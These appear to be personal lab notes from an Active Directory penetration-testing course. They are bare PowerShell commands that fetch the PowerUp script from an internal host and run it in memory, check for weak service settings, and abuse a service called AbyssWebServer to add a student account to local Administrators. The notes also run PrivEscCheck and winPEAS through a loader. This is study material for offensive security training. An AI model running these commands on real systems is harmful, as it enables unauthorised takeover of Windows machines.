
```powershell
Import-Module .\PowerUp.ps1
iex(iwr 'http://172.16.100.48/PowerUp.ps1' -useb)

Invoke-AllChecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose

help  Invoke-ServiceAbuse

Invoke-ServiceAbuse -Name AbyssWebServer -UserName "dcorp\student548" -Verbose
net1 localgroup Administrators
```

```powershell
Import-Module .\PrivEscCheck.ps1

Invoke-PrivEscCheck
```

```powershell
.\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```


